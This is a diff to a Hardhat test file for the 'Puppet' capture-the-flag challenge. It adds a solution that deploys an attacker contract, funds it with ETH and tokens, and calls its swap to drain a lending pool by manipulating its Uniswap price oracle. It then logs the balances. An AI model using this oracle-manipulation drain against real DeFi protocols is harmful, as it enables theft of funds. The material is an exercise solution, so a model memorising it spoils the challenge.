@@ -95,6 +95,42 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const Attacker = await ethers.getContractFactory("AttackPuppet");
+        const attacker = await Attacker.deploy(
+            uniswapExchange.address,
+            lendingPool.address,
+            token.address,
+            player.address,
+            { value: ethers.utils.parseEther("15") }
+        );
+        console.log("Attacker @", attacker.address);
+        let bal = await attacker.provider.getBalance(attacker.address);
+        console.log(
+            "Attacker ETH balance before",
+            ethers.utils.formatEther(bal.toString())
+        );
+        await token
+            .connect(player)
+            .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        bal = await token.balanceOf(attacker.address);
+        console.log(
+            `Attacker token balance before `,
+            ethers.utils.formatEther(bal.toString())
+        );
+        await attacker.swap();
+
+        let balance = await attacker.provider.getBalance(attacker.address)
+
+        console.log(
+            `Attacker Balance`,
+            ethers.utils.formatEther(balance.toString())
+        );
+
+        let amount = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log(
+            `Calculated Balance`,
+            ethers.utils.formatEther(amount.toString())
+        );   
     });
 
     after(async function () {
@@ -110,5 +146,11 @@ describe('[Challenge] Puppet', function () {
         expect(
             await token.balanceOf(player.address)
         ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
+        
+        let balance = await ethers.provider.getBalance(player.address)
+        console.log(
+            `Player Balance`,
+            ethers.utils.formatEther(balance.toString())
+        );
     });
 });
